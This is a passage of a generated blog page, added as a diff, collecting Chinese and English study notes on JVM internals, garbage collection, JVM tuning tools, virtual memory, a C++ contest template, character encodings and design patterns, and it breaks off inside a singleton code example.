@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-JVM-intro" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/12/02/JVM-intro/" class="article-date">
+  <time class="dt-published" datetime="2020-12-03T04:17:31.000Z" itemprop="datePublished">2020-12-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/12/02/JVM-intro/">深入JVM</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="Learn-about-JVM-internals"><a href="#Learn-about-JVM-internals" class="headerlink" title="Learn about JVM internals"></a>Learn about JVM internals</h2><p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=UwB0OSmkOtQ">https://www.youtube.com/watch?v=UwB0OSmkOtQ</a><br>look inside an interpreter</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">while(true) &#123;</span><br><span class="line">	bytecode b = bytecodeStream[pc++]</span><br><span class="line">	switch(b) &#123;</span><br><span class="line">		case iconst_1: push(1); break;</span><br><span class="line">		case iload_0: push(local(0)); break;</span><br><span class="line">		case iadd: push(pop() + pop()); break;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="JVM结构"><a href="#JVM结构" class="headerlink" title="JVM结构"></a>JVM结构</h2><p><img src="/images/jvm_intro/jvm.png"></p>
+<h2 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h2><p>Division of Heap into Eden, Survivor and Tenured/Old spaces</p>
+<ul>
+<li>Minor GC: Collecting garbage from Young space (consisting of Eden and Survivor spaces) is called a Minor GC. </li>
+<li>Major GC is cleaning the Tenured space.</li>
+<li>Full GC is cleaning the entire Heap – both Young and Tenured spaces.<br><img src="/images/jvm_intro/gc.png"></li>
+</ul>
+<h2 id="可达性分析算法（根可达）"><a href="#可达性分析算法（根可达）" class="headerlink" title="可达性分析算法（根可达）"></a>可达性分析算法（根可达）</h2><p><img src="/images/jvm_intro/root.png"></p>
+<p>python: 计数器的方式，没有办法对相互引用对象进行回收</p>
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public class B &#123;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		A a1 = new A();</span><br><span class="line">		A a2 = new A();</span><br><span class="line">		A a3 = new A();</span><br><span class="line">		a3 = a1;</span><br><span class="line">		a1 = a2;</span><br><span class="line">		a2 = null;</span><br><span class="line">		a3 = a1;</span><br><span class="line">	&#125; // 当代码运行这的时候，有多少对象符合垃圾回收的条件</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">	long l = 1200L; // 不是基本数据类型--包装类型 类 字节码 long.valueOf(1200)</span><br><span class="line">	// 如果 l = 12L, 正确答案是2个，因为包装类型有缓存</span><br><span class="line">	public void a2() &#123;</span><br><span class="line">		System.out.println(&quot;hello&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/jvm_intro/case1_ans.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/12/02/JVM-intro/" data-id="ckqhp9u6m00073ot0c91084br" data-title="深入JVM" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JVM/" rel="tag">JVM</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-ACM-template" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/11/29/ACM-template/" class="article-date">
+  <time class="dt-published" datetime="2020-11-30T04:15:42.000Z" itemprop="datePublished">2020-11-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/11/29/ACM-template/">acm 模板</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">#define _debug(x) &#123; cerr &lt;&lt; &quot;\033[94m&quot; &lt;&lt; __func__ &lt;&lt; &quot; &quot; &lt;&lt; #x &lt;&lt; &quot;: &quot; &lt;&lt; (x) &lt;&lt; &quot;\n\033[0m&quot;; &#125;</span><br><span class="line">#define rep(i, a, b) for (int i = (a); i &lt;= (b); i++)</span><br><span class="line">#define pre(i, b, a) for (int i = (b); i &gt;= (a); i--)</span><br><span class="line">#define clr(x, v) memset(x, v, sizeof (x))</span><br><span class="line">#define all(x) x.begin(), x.end()</span><br><span class="line">#define sz(x) (int) x.size()</span><br><span class="line">#define pb push_back</span><br><span class="line">#define mkp make_pair</span><br><span class="line">#define fi first</span><br><span class="line">#define se second</span><br><span class="line">template&lt;class T&gt; inline void amin(T &amp;x, const T &amp;y) &#123; if (y&lt;x) x=y; &#125;</span><br><span class="line">template&lt;class T&gt; inline void amax(T &amp;x, const T &amp;y) &#123; if (x&lt;y) x=y; &#125;</span><br><span class="line">using ll = signed long long;</span><br><span class="line">using pii = pair&lt;int, int&gt;;</span><br><span class="line">using vi = vector&lt;int&gt;;</span><br><span class="line">using vvi = vector&lt;vi&gt;;</span><br><span class="line">const int inf = 0x3f3f3f3f;</span><br><span class="line">const int MOD = 1e9 + 7;</span><br><span class="line">const int maxn = 700;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    ios::sync_with_stdio(false);</span><br><span class="line">    cin.tie(0);</span><br><span class="line">    int _;</span><br><span class="line">    for(scanf(&quot;%d&quot;,&amp;_);_;_--) &#123;</span><br><span class="line">        solve();</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/29/ACM-template/" data-id="ckqhp9u6i00033ot05xvg49ts" data-title="acm 模板" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ACM/" rel="tag">ACM</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Virtual-Memory" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/11/28/Virtual-Memory/" class="article-date">
+  <time class="dt-published" datetime="2020-11-28T17:24:51.000Z" itemprop="datePublished">2020-11-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/11/28/Virtual-Memory/">Virtual Memory</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><img src="/images/virtual_mem/intro.png"></p>
+<h2 id="Handling-Page-Fault"><a href="#Handling-Page-Fault" class="headerlink" title="Handling Page Fault"></a>Handling Page Fault</h2><ul>
+<li>page miss causes page fault (an exception)</li>
+<li>page fault handler selects a victim to be evicted(here vp4)</li>
+</ul>
+<p><img src="/images/virtual_mem/page_fault1.png"></p>
+<p><img src="/images/virtual_mem/page_fault2.png"></p>
+<h2 id="Tool-for-caching"><a href="#Tool-for-caching" class="headerlink" title="Tool for caching"></a>Tool for caching</h2><ul>
+<li><p>uses main memory efficiently<br>  use DRAM as a cache for parts of a virtual address space</p>
+</li>
+<li><p>DRAM is about <strong>10x</strong> slower than SRAM</p>
+</li>
+<li><p>Disk is about <strong>10,000x</strong> slower than DRAM<br><img src="/images/virtual_mem/cache.png"></p>
+</li>
+</ul>
+<h2 id="Tool-for-Memory-Management"><a href="#Tool-for-Memory-Management" class="headerlink" title="Tool for Memory Management"></a>Tool for Memory Management</h2><p>Each process gets the same uniform linear address space, simplify memory allocation</p>
+<ul>
+<li>Each virtual page can be mapped to any physical page</li>
+<li>A virtual page can be stored in different physical pages at different time</li>
+</ul>
+<p>Shared libraries, lib.c is the same code for every process running on the system<br><img src="/images/virtual_mem/manage.png"></p>
+<h2 id="Simplify-Linking-and-loading"><a href="#Simplify-Linking-and-loading" class="headerlink" title="Simplify Linking and loading"></a>Simplify Linking and loading</h2><ul>
+<li>Linking<ul>
+<li>Each program has similar virtual address space</li>
+<li>Code, data, and heap always start at the same address</li>
+</ul>
+</li>
+<li>Loading<ul>
+<li><strong>execve</strong> allocates virtual pages for <strong>.text</strong> and <strong>.data</strong> sections &amp; create PTEs marked as invalid</li>
+<li>The <strong>.text</strong> and <strong>.data</strong> sections are copied, page by page, on demand by the virtual memory system<br><img src="/images/virtual_mem/load.png"></li>
+</ul>
+</li>
+</ul>
+<h2 id="isolate-address-spaces"><a href="#isolate-address-spaces" class="headerlink" title="isolate address spaces"></a>isolate address spaces</h2><pre><code>- one process can&#39;t interfere with another&#39;s memory
+- user program cannot access privileged kernel information and code
+</code></pre>
+<h1 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h1><ul>
+<li><p>When you load a page from disk into memory, does it also get cached in cached memory hierarchy?<br>Yes, if you load an entire page, that page will be <strong>broken up into 64 bytes blocks and load it into the cache</strong>.<br>So everything you fetch from the memory goes through the cache hierarchy.</p>
+</li>
+<li><p>How is the virtual address space implemented on disk?<br>Most pages there’s an option when you allocate a new virtual memory page, you can allocate it so that it’s all zeros, you can say I want to allcoate a page of all zeros. In that case, that page doesn’t need to get stored on disk, it’s just as though it was created on disk and then loaded into memory. <strong>So thoese pages that are all zeros don’t exist on disk.</strong> When pages are modified, pages can be mapped to particular files for example when we load and elf binary, the pages that correspond to the code are actually mapped to the bytes in the binary that contains the code. So when you miss on that page it brings in those code pages. <strong>So pages can be mapped to user level files on disk or not(they can be anonymous and not mapped).</strong> So if they’re mapped to user level files and you write to a page, then it will get written back to the page that i’s mapped to. <strong>If it’s not mapped to any page, it’s stored in this area called the swap area or the swap file.</strong></p>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/28/Virtual-Memory/" data-id="ckqhp9u6q000k3ot0b90edx55" data-title="Virtual Memory" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-JVM-Opt" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/11/27/JVM-Opt/" class="article-date">
+  <time class="dt-published" datetime="2020-11-28T04:40:54.000Z" itemprop="datePublished">2020-11-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/11/27/JVM-Opt/">JVM 调优案例</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="命令行工具"><a href="#命令行工具" class="headerlink" title="命令行工具"></a>命令行工具</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">jps -v: 查找java的进程，虚拟机进程状况工具</span><br><span class="line"></span><br><span class="line">-XX 高级选项 针对开发</span><br><span class="line">-XX: +PrintGC (+表示开启，-表示关闭)</span><br><span class="line">-XX key=123</span><br><span class="line"></span><br><span class="line">jinfo -flags [pid] 查看 VM的参数</span><br><span class="line">jinfo -flag +PrintGC [pid] 运行时修改 VM的参数</span><br><span class="line"></span><br><span class="line">jstat 统计一些信息：比如GC</span><br><span class="line">jstat -gc [pid] 2000 10:显示垃圾回收情况, 每次隔2秒钟，统计10次</span><br><span class="line"></span><br><span class="line">jmap 内存印象工具</span><br><span class="line">jmap -heap</span><br><span class="line">jmap -histo [pid]: 查找对象</span><br><span class="line"></span><br><span class="line">jstack Java推栈跟踪工具</span><br><span class="line">jstack [pid]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/jvm_opt/problem.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">public class FullGCProblem &#123;</span><br><span class="line"></span><br><span class="line">	private static ScheduledThreadPoolExecutor executor </span><br><span class="line">	= new ScheduledThreadPoolExecutor(50, new ThreadPoolExecutor.DiscardOldestPolicy());</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) throws Exception &#123;</span><br><span class="line">		// 50个线程</span><br><span class="line">		executor.setMaximumPoolSize(50);</span><br><span class="line">		while (true) &#123;</span><br><span class="line">			calc();</span><br><span class="line">			Thread.sleep(100);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 多线程执行计算任务</span><br><span class="line">	private static void calc() &#123;</span><br><span class="line">		List&lt;UserInfo&gt; taskList = getAllCardInfo();</span><br><span class="line">		taskList.forEach(userInfo -&gt; &#123;</span><br><span class="line">				executor.scheduledWithFixedDelay(() -&gt; &#123;</span><br><span class="line">					userInfo.user();</span><br><span class="line">				&#125;, 2, 3, TimeUnit.SECONDS);</span><br><span class="line">			&#125;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 模拟从数据库读取数据，返回</span><br><span class="line">	private static List&lt;UserInfo&gt; getAllCardInfo() &#123;</span><br><span class="line">		List&lt;UserInfo&gt; taskList = new ArrayList&lt;&gt;();</span><br><span class="line">		for (int i = 0; i &lt; 100; i++) &#123;</span><br><span class="line">			UserInfo userInfo = new UserInfo();</span><br><span class="line">			taskList.add(userInfo);</span><br><span class="line">		&#125;</span><br><span class="line">		return taskList;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private static class UserInfo() &#123;</span><br><span class="line">		String name = &quot;kai&quot;;</span><br><span class="line">		int age = 18;</span><br><span class="line">		BigDecimal money = new BigDecimal(99999);</span><br><span class="line"></span><br><span class="line">		public void user() &#123;</span><br><span class="line">			// 业务逻辑什么都没做</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>CPU占用过高，垃圾回收期在疯狂工作<br>阿里开发手册 线程命名</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/27/JVM-Opt/" data-id="ckqhp9u6l00063ot0e0jxbqc1" data-title="JVM 调优案例" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JVM/" rel="tag">JVM</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-character-coding" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/11/10/character-coding/" class="article-date">
+  <time class="dt-published" datetime="2020-11-10T23:03:56.000Z" itemprop="datePublished">2020-11-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/11/10/character-coding/">ASCII,GB2312,Unicode,UTF8,UTF16</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="ASCII-American-Standard-Code-Information-Interchange"><a href="#ASCII-American-Standard-Code-Information-Interchange" class="headerlink" title="ASCII (American Standard Code Information Interchange)"></a>ASCII (American Standard Code Information Interchange)</h2><p><code>可见字符 95个 控制字符 33个</code><br><img src="/images/character_coding/ascii.png"></p>
+<h2 id="中文"><a href="#中文" class="headerlink" title="中文"></a>中文</h2><h3 id="设计字符集GB2312"><a href="#设计字符集GB2312" class="headerlink" title="设计字符集GB2312"></a>设计字符集GB2312</h3><p>分区管理，共计94个区，每个区含94个位，共8836个码位<br>01-09区收录除汉字外的682个字符t<br>10-15区为空白区，没有使用<br>16-55区收录3755个一级汉字，按拼音排序<br>56-87区收录3008个二级汉字，按部首/笔画排序<br>99-94区位空白区，没有使用</p>
+<h3 id="存储GB2312"><a href="#存储GB2312" class="headerlink" title="存储GB2312"></a>存储GB2312</h3><p>eg 侃 5709</p>
+<p>0x57+0xA0（大于127，避开ascii码）=0xD9<br>0x09+0xA0=0xA9</p>
+<p>得到侃的GB2312码: <code>0xD90XA9</code></p>
+<h3 id="扩展GB2312：GBK"><a href="#扩展GB2312：GBK" class="headerlink" title="扩展GB2312：GBK"></a>扩展GB2312：GBK</h3><p>新增20000个汉字和符号，不再规定地位大于127</p>
+<h3 id="扩展GBK：GB18030"><a href="#扩展GBK：GB18030" class="headerlink" title="扩展GBK：GB18030"></a>扩展GBK：GB18030</h3><p>新增几千少数民族字符</p>
+<h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p>不同国家有不同的编码，Unicode统一所有的字符编码</p>
+<p>一开始unicode使用UCS-2字符集(Universal Character Set)，16位可表示65536个字符<br>但还是无法表示世界上所有的字符<br>后来又有了UCS-4字符集，用32位表示一个字符，可表示近43亿个字符<br>但是空间过大，不能接受</p>
+<p><code>Unicode是用0至65535之间的数字来表示所有字符.其中0至127这128个数字表示的字符仍然跟ASCII完全一样.65536是2的16次方.这是第一步.第二步就是怎么把0至65535这些数字转化成01串保存到计算机中.这肯定就有不同的保存方式了.于是出现了UTF(unicode transformation format),有UTF-8,UTF-16.</code></p>
+<h2 id="UTF-8编码（unicode-transformation-format）"><a href="#UTF-8编码（unicode-transformation-format）" class="headerlink" title="UTF-8编码（unicode transformation format）"></a>UTF-8编码（unicode transformation format）</h2><p>将UCS-4字符集的码位划分为4个区间<br><img src="/images/character_coding/utf8.png"></p>
+<p>e.g.<br>编 （unicode 32534) :<br>-&gt;十进制 32534<br>-&gt;二进制 0111 11 1100 01 0110<br>(1110xx 10xx 10xx)<br>-&gt;(1110) 0111 (10)11 1100 (10)01 0110<br>-&gt; e     7    b      c    9      6<br>-&gt; UTF-8: e7 bc 96<br>-&gt; URL编码: %e7%bc%96</p>
+<h2 id="UTF-16编码"><a href="#UTF-16编码" class="headerlink" title="UTF-16编码"></a>UTF-16编码</h2><p>在Unicode基本多文种平面定义的字符（无论是拉丁字母、汉字或其他文字或符号），一律使用2字节储存。而在辅助平面定义的字符，会以代理对（surrogate pair）的形式，以两个2字节的值来储存。</p>
+<p>UTF-16比起UTF-8，好处在于大部分字符都以固定长度的字节（2字节）储存，但UTF-16却无法兼容于ASCII编码。</p>
+<p>Java char类型采用UTF-16编码表示一个代码单元, 辅助平面定义的字符需要用两个char表示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">String s = &quot;hi\uD83E\uDF60&quot;;</span><br><span class="line">System.out.println(s);</span><br><span class="line">System.out.println(s.length());</span><br><span class="line">int cpCount = s.codePointCount(0, s.length());</span><br><span class="line">System.out.println(cpCount);</span><br><span class="line">char ch = s.charAt(2);</span><br><span class="line">System.out.println(ch);</span><br><span class="line"></span><br><span class="line">hi🭠</span><br><span class="line">4</span><br><span class="line">3</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/10/character-coding/" data-id="ckqhp9u6u000u3ot0ema249yh" data-title="ASCII,GB2312,Unicode,UTF8,UTF16" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-design-pattern" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/10/10/design-pattern/" class="article-date">
+  <time class="dt-published" datetime="2020-10-10T17:29:35.000Z" itemprop="datePublished">2020-10-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/10/10/design-pattern/">设计模式</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="GOF-group-of-four-四人帮-国外大牛总结出23种套路。"><a href="#GOF-group-of-four-四人帮-国外大牛总结出23种套路。" class="headerlink" title="GOF: group of four 四人帮, 国外大牛总结出23种套路。"></a>GOF: group of four 四人帮, 国外大牛总结出23种套路。</h1><ul>
+<li>创建型模式：单例模式，工厂模式，抽象工厂模式，建造者模式，原型模式</li>
+<li>结构型模式：适配器模式，桥接模式，装饰模式，组合模式，外观模式，享元模式，代理模式</li>
+<li>行为型模式：模板方法模式，命令模式，迭代器模式，观察者模式，中介者模式，备忘录模式，解释器模式，状态模式，策略模式，职责链模式，访问者模式</li>
+</ul>
+<h1 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 饿汉单例模式</span><br><span class="line"> */</span><br><span class="line">public class Singleton &#123;</span><br><span class="line"></span><br><span class="line">    // 类初始化时，立即加载这个对象 (由于加载类时，天然的线程安全, 不需要同步)</span><br><span class="line">    private static Singleton instance = new Singleton();</span><br><span class="line"></span><br><span class="line">    private Singleton() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 方法没有同步，调用效率高</span><br><span class="line">    public static Singleton getInstance() &#123;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 懒汉单例模式</span><br><span class="line"> */</span><br><span class="line">class Singleton2 &#123;</span><br><span class="line"></span><br><span class="line">    private static Singleton2 instance;</span><br><span class="line"></span><br><span class="line">    private Singleton2() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    public static synchronized Singleton2 getInstance() &#123;</span><br><span class="line">        if (instance == null) &#123;</span><br><span class="line">            instance = new Singleton2();</span><br><span class="line">        &#125;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 静态内部类,也是一种懒汉单例模式</span><br><span class="line"> */</span><br><span class="line">class Singleton3 &#123;</span><br><span 